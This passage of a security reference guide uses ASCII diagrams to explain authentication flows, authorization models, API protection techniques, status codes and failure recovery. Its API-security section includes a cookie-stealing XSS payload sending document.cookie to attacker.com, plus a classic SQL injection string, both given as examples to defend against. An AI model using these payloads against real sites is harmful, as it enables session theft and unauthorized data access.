│   │                       │  Create Session     │              │
│   │                       │─────────────────────►│              │
│   │                       │                      │              │
│   │                       │  Session ID         │              │
│   │                       │◄─────────────────────│              │
│   │                       │                      │              │
│   │  Set Cookie with     │                      │              │
│   │  Session ID          │                      │              │
│   │◄─────────────────────│                      │              │
│   │                       │                      │              │
│   │  Request with        │                      │              │
│   │  Cookie: session_id  │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
│   │                       │  Lookup Session     │              │
│   │                       │─────────────────────►│              │
│   │                       │                      │              │
│   │                       │  User Data          │              │
│   │                       │◄─────────────────────│              │
│   │                       │                      │              │
│   │       ┌────────────────┴────────────┐       │              │
│   │       │  Valid: Process Request     │       │              │
│   │       │  Invalid: 401 Unauthorized  │       │              │
│   │       └────────────────┬────────────┘       │              │
│   │                       │                      │              │
│   │  Authorized Response  │                      │              │
│   │◄─────────────────────│                      │              │
│                                                                 │
│  ✅ Stateful, easy to revoke                                   │
│  ❌ Hard to scale distributed systems                          │
│  🔧 Recovery: Use Redis for session store, load balance        │
└─────────────────────────────────────────────────────────────────┘
```

### JWT Bearer Token Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                JWT BEARER TOKEN AUTHENTICATION                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                AUTH SERVER           API SERVER        │
│   │                       │                      │              │
│   │  POST /auth/login   │                      │              │
│   │  username/password  │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
│   │                       │  Validate credentials │              │
│   │                       │                      │              │
│   │  {                   │                      │              │
│   │    access_token:     │                      │              │
│   │    "eyJhbGci..."     │                      │              │
│   │  }                   │                      │              │
│   │◄─────────────────────│                      │              │
│   │                       │                      │              │
│   │  GET /api/users      │                      │              │
│   │  Authorization:      │                      │              │
│   │  Bearer eyJhbGci...  │                      │              │
│   │─────────────────────────────────────────────►│              │
│   │                       │                      │              │
│   │                       │       Verify Token Signature        │
│   │                       │       (Stateless - no DB lookup)    │
│   │                       │                      │              │
│   │       ┌──────────────────────────────────────┐│              │
│   │       │  Valid Token: 200 OK with data      ││              │
│   │       │  Invalid Token: 401 Unauthorized    ││              │
│   │       └──────────────────────────────────────┘│              │
│   │◄─────────────────────────────────────────────│              │
│                                                                 │
│  JWT Structure:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Header: {"alg": "HS256", "typ": "JWT"}             │      │
│  │  Payload: {"user_id": 123, "role": "admin", exp}    │      │
│  │  Signature: HMACSHA256(base64Header + base64Payload) │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ✅ Stateless, self-contained, scalable                       │
│  ❌ Can't revoke individual tokens, size overhead              │
│  🔧 Recovery: Short expiry, refresh tokens, blacklist          │
└─────────────────────────────────────────────────────────────────┘
```

### Access & Refresh Token Lifecycle

```
┌─────────────────────────────────────────────────────────────────┐
│              ACCESS & REFRESH TOKEN LIFECYCLE                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT              AUTH SERVER              API SERVER       │
│   │                     │                         │             │
│   │  Login Request     │                         │             │
│   │────────────────────►│                         │             │
│   │                     │                         │             │
│   │  Access Token:     │                         │             │
│   │  15 min - 1 hour   │                         │             │
│   │  Refresh Token:    │                         │             │
│   │  7 - 30 days       │                         │             │
│   │◄────────────────────│                         │             │
│   │                     │                         │             │
│   │  Request with       │                         │             │
│   │  Access Token       │                         │             │
│   │────────────────────────────────────────────────►│             │
│   │                     │                         │             │
│   │  ┌────────────────────────────────────────────┐│             │
│   │  │  Access Token Expired (401)               ││             │
│   │  └────────────────────────────────────────────┘│             │
│   │◄────────────────────────────────────────────────│             │
│   │                     │                         │             │
│   │  Refresh Token     │                         │             │
│   │  Request            │                         │             │
│   │────────────────────►│                         │             │
│   │                     │                         │             │
│   │  New Access Token   │                         │             │
│   │◄────────────────────│                         │             │
│   │                     │                         │             │
│   │  Request with       │                         │             │
│   │  New Token          │                         │             │
│   │────────────────────────────────────────────────►│             │
│   │                     │                         │             │
│   │  Success with Data  │                         │             │
│   │◄────────────────────────────────────────────────│             │
│                                                                 │
│  🛡️  SECURITY: Store refresh tokens in httpOnly cookies       │
│  ⚠️  NEVER store tokens in localStorage                        │
│  🔧 Recovery: Rotate tokens, detect unusual activity           │
└─────────────────────────────────────────────────────────────────┘
```

### OAuth 2.0 Authorization Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  OAUTH 2.0 AUTHORIZATION FLOW                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER              YOUR APP            GOOGLE OAuth            │
│   │                   │                    │                    │
│   │  1. Connect Google│                    │                    │
│   │   Drive           │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │                    │                    │
│   │  2. Redirect to   │                    │                    │
│   │   Consent Screen  │                    │                    │
│   │◄──────────────────│                    │                    │
│   │                   │                    │                    │
│   │  3. Show          │                    │                    │
│   │   Permission      │                    │                    │
│   │   Request         │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │  4. Allow Access   │                    │
│   │                   │───────────────────►│                    │
│   │                   │                    │                    │
│   │  5. Return        │  6. Exchange      │                    │
│   │   Auth Code       │   Code for Token  │                    │
│   │◄──────────────────│───────────────────►│                    │
│   │                   │                    │                    │
│   │                   │  7. Return         │                    │
│   │                   │   Access Token     │                    │
│   │                   │◄───────────────────│                    │
│   │                   │                    │                    │
│   │  8. Request       │  9. Access Token   │                    │
│   │   Files with      │   proves app CAN   │                    │
│   │   Token           │   access resources  │                    │
│   │──────────────────►│───────────────────►│                    │
│   │                   │                    │                    │
│   │  10. Return       │                    │                    │
│   │   User Files      │                    │                    │
│   │◄──────────────────│                    │                    │
│                                                                 │
│  ⚠️  OAuth2 is AUTHORIZATION, not AUTHENTICATION                │
│  📌  Access token gives permission to RESOURCES                │
│  🆔  Doesn't identify the user                                 │
└─────────────────────────────────────────────────────────────────┘
```

### OpenID Connect (OIDC) Authentication Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                   OIDC AUTHENTICATION FLOW                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER              YOUR APP            GOOGLE IDENTITY         │
│   │                   │                    │                    │
│   │  1. Click Sign    │                    │                    │
│   │   In with Google  │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │                    │                    │
│   │  2. Redirect to   │                    │                    │
│   │   Auth Endpoint   │                    │                    │
│   │◄──────────────────│                    │                    │
│   │                   │                    │                    │
│   │  3. Show Login    │                    │                    │
│   │   Screen          │                    │                    │
│   │──────────────────►│  4. Enter Creds    │                    │
│   │                   │   & Consent       │                    │
│   │                   │───────────────────►│                    │
│   │                   │                    │                    │
│   │  5. Return Auth   │  6. Exchange      │                    │
│   │   Code            │   Code for Tokens │                    │
│   │◄──────────────────│───────────────────►│                    │
│   │                   │                    │                    │
│   │                   │  7. Return Access │                    │
│   │                   │   + ID Token       │                    │
│   │                   │◄───────────────────│                    │
│   │                   │                    │                    │
│   │  8. Send ID       │  9. Identity      │                    │
│   │   Token for       │   Confirmed,      │                    │
│   │   Verification    │   Session Created │                    │
│   │──────────────────►│───────────────────►│                    │
│   │                   │                    │                    │
│   │  10. Logged In    │                    │                    │
│   │   Successfully    │                    │                    │
│   │◄──────────────────│                    │                    │
│                                                                 │
│  ✅ OIDC is AUTHENTICATION on top of OAuth2                    │
│  🆔 ID Token contains user identity claims                     │
│  🔧 Recovery: Handle expired tokens, session refresh           │
└─────────────────────────────────────────────────────────────────┘
```

### Single Sign-On (SSO)

```
┌─────────────────────────────────────────────────────────────────┐
│                 SINGLE SIGN-ON (SSO)                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │                     USER                                  ││
│  │                   1. Login Once                           ││
│  │  ┌──────────────────────────────────────────────────────┐ ││
│  │  │  2. Access Gmail  3. Access Drive  4. Access YouTube│ ││
│  │  └──────────────────────────────────────────────────────┘ ││
│  └─────────────────────────────────────────────────────────────┘│
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │          IDENTITY PROVIDER (Google, Okta)                 ││
│  │                                                           ││
│  │  ┌────────────────────────────────────────────────────┐   ││
│  │  │              Global Session Store                  │   ││
│  │  │  - Verified Session → Confirmed (no login needed)  │   ││
│  │  └────────────────────────────────────────────────────┘   ││
│  └─────────────────────────────────────────────────────────────┘│
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │                     APPLICATIONS                           ││
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                ││
│  │  │  Gmail   │  │  Drive   │  │ YouTube  │                ││
│  │  └──────────┘  └──────────┘  └──────────┘                ││
│  └─────────────────────────────────────────────────────────────┘│
│                                                                 │
│  📌 SSO is a USER EXPERIENCE PATTERN, not an authentication    │
│     method itself                                              │
│  ✅ One login, access to multiple applications                  │
│  ❌ Single point of failure, complex setup                     │
│  🔧 Recovery: Fallback authentication methods                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Authorization Frameworks

### Authorization Models Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│              AUTHORIZATION MODELS                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  RBAC (Role-Based Access Control)                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Roles → Permissions                               │      │
│  │                                                    │      │
│  │  ADMIN: create, read, update, delete, manage users  │      │
│  │  EDITOR: create, read, update content               │      │
│  │  VIEWER: read content only                          │      │
│  │                                                    │      │
│  │  Example: GitHub access roles                       │      │
│  │  ✅ Simple to manage, good for orgs                │      │
│  │  ❌ Not flexible for complex scenarios             │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ABAC (Attribute-Based Access Control)                         │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Policy based on attributes:                        │      │
│  │                                                    │      │
│  │  user.department == "HR" &&                         │      │
│  │  time < 6PM &&                                      │      │
│  │  resource.confidentiality == "internal"             │      │
│  │                                                    │      │
│  │  ✅ Fine-grained, dynamic                           │      │
│  │  ❌ Complex to manage, performance overhead         │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ACL (Access Control List)                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Each resource has its own permission list          │      │
│  │                                                    │      │
│  │  doc_123.json:                                      │      │
│  │    Alice: Read                                      │      │
│  │    Bob: Read/Write                                  │      │
│  │    Carol: No access                                 │      │
│  │                                                    │      │
│  │  Example: Google Docs sharing                       │      │
│  │  ✅ Granular resource control                      │      │
│  │  ❌ Hard to scale with many resources              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### OAuth2 & JWT Authorization Example

```
┌─────────────────────────────────────────────────────────────────┐
│            JWT TOKEN WITH AUTHORIZATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JWT Payload Example:                                          │
│  {                                                             │
│    "userID": "user_123",                                       │
│    "roles": ["admin", "editor"],                               │
│    "scopes": ["read:posts", "write:posts", "delete:posts"],   │
│    "expires": "12h",                                           │
│    "issuer": "auth.example.com"                                │
│  }                                                             │
│                                                                 │
│  USER REQUEST:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  GET /api/admin/users                               │      │
│  │  Authorization: Bearer eyJhbGci...                  │      │
│  └──────────────────────────────────────────────────────┘      │
│                            │                                    │
│                            ▼                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Authorization Decision:                            │      │
│  │                                                    │      │
│  │  IF role CONTAINS "admin" AND                       │      │
│  │     scope CONTAINS "read:users"                    │      │
│  │  THEN Allow                                        │      │
│  │  ELSE 403 Forbidden                                │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  OAUTH2 DELEGATED AUTHORIZATION:                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  User → 3rd Party App → GitHub API                  │      │
│  │        (request access)  (get token)                │      │
│  │                                                    │      │
│  │  💡 OAuth2 = "I allow App X to access my GitHub    │      │
│  │     repositories"                                   │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## API Security Best Practices

### 7 Techniques to Protect APIs

```
┌─────────────────────────────────────────────────────────────────┐
│                  API SECURITY TECHNIQUES                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. RATE LIMITING                                               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Per endpoint: 100 req/min                       │      │
│  │  - Per user/IP: 1000 req/hour                     │      │
│  │  - Global: Mitigate DDoS attacks                    │      │
│  │                                                    │      │
│  │  ✅ Prevents abuse, protects resources              │      │
│  │  ❌ Can impact legitimate users                     │      │
│  │  🔧 Recovery: Exponential backoff, retry-after      │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  2. CORS (Cross-Origin Resource Sharing)                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Specify allowed origins: *.example.com           │      │
│  │  - Restrict methods: GET, POST, PUT                 │      │
│  │  - Control exposed headers                          │      │
│  │                                                    │      │
│  │  ✅ Prevents unauthorized cross-origin requests     │      │
│  │  ❌ Misconfiguration can cause security issues      │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3. SQL & NoSQL Injection Prevention                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  ✅ Use ORM safeguards                              │      │
│  │  ✅ Parameterized queries                           │      │
│  │  ✅ Input validation and sanitization               │      │
│  │  ❌ Concatenated SQL strings                        │      │
│  │                                                    │      │
│  │  Example Attack:                                    │      │
│  │  SELECT * FROM users WHERE id = '1' OR '1'='1'     │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  4. Web Application Firewalls (WAF)                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Block suspicious keywords                         │      │
│  │  - Filter strange HTTP methods                      │      │
│  │  - Block SQL injection attempts                     │      │
│  │                                                    │      │
│  │  ✅ Protects against known attacks                  │      │
│  │  ❌ Can block legitimate traffic (false positives)   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  5. VPNs & Private Networks                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Internal APIs accessible only via private IPs     │      │
│  │  - Required for sensitive infrastructure            │      │
│  │                                                    │      │
│  │  ✅ Reduces attack surface                          │      │
│  │  ❌ Complicates development access                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  6. CSRF (Cross-Site Request Forgery) Protection               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Session cookies (same-site)                      │      │
│  │  - CSRF tokens required                             │      │
│  │  - Double-submit cookies                            │      │
│  │                                                    │      │
│  │  ✅ Prevents unauthorized state-changing requests   │      │
│  │  ❌ Adds complexity to APIs                         │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  7. XSS (Cross-Site Scripting) Prevention                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Example Attack:                                    │      │
│  │  <script>fetch('https://attacker.com/steal?c='+    │      │
│  │          document.cookie);</script>                  │      │
│  │                                                    │      │
│  │  ✅ Sanitize user input                             │      │
│  │  ✅ Escape output (HTML encode)                     │      │
│  │  ✅ Content Security Policy (CSP)                   │      │
│  │  ❌ No trust of user input                          │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### HTTP Status Codes Reference

```
┌─────────────────────────────────────────────────────────────────┐
│                   HTTP STATUS CODES                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  2xx: SUCCESS                                                  │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  200 OK: Request succeeded                         │      │
│  │  201 Created: Resource created successfully         │      │
│  │  204 No Content: Success, no response body         │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3xx: REDIRECTION                                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  301 Moved Permanently: Resource moved permanently  │      │
│  │  304 Not Modified: Cache hit                       │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  4xx: CLIENT ERROR                                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  400 Bad Request: Malformed request                 │      │
│  │  401 Unauthorized: Authentication failed            │      │
│  │  403 Forbidden: Authentication success, but not     │      │
│  │              authorized to access resource          │      │
│  │  404 Not Found: Resource doesn't exist             │      │
│  │  429 Too Many Requests: Rate limited               │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  5xx: SERVER ERROR                                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  500 Internal Server Error: Generic server error    │      │
│  │  502 Bad Gateway: Upstream server error             │      │
│  │  503 Service Unavailable: Server overloaded         │      │
│  │  504 Gateway Timeout: Upstream timeout              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Error Recovery & Graceful Degradation

### Failure Scenarios & Recovery

```
┌─────────────────────────────────────────────────────────────────┐
│                   FAILURE RECOVERY STRATEGIES                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SCENARIO 1: Database Failure                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Primary DB goes down                   │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Auto-failover to replica                      │      │
│  │    2. Read-only mode while replicating              │      │
│  │    3. Return cached stale data if acceptable        │      │
│  │    4. Queue writes for later sync                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 2: Cache Failure                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Redis crashes                          │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Circuit breaker trips                         │      │
│  │    2. Fall back to database                         │      │
│  │    3. Monitor database load                         │      │
│  │    4. Gradually warm cache                          │      │
│  │    5. Implement cache stampede protection           │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 3: Service Unavailable                               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Microservice down                      │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Retry with exponential backoff                │      │
│  │    2. Return cached or default response             │      │
│  │    3. Queue requests for later processing           │      │
│  │    4. Degrade functionality gracefully              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 4: Rate Limiting Hit                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: User exceeds rate limit                │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Return 429 with Retry-After header            │      │
│  │    2. Client implements exponential backoff         │      │
│  │    3. Request queuing with priority                 │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 5: Authentication Failure                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: JWT token expired                      │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Use refresh token to get new access token     │      │
│  │    2. Re-authenticate user                          │      │
│  │    3. Fallback to session-based authentication      │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

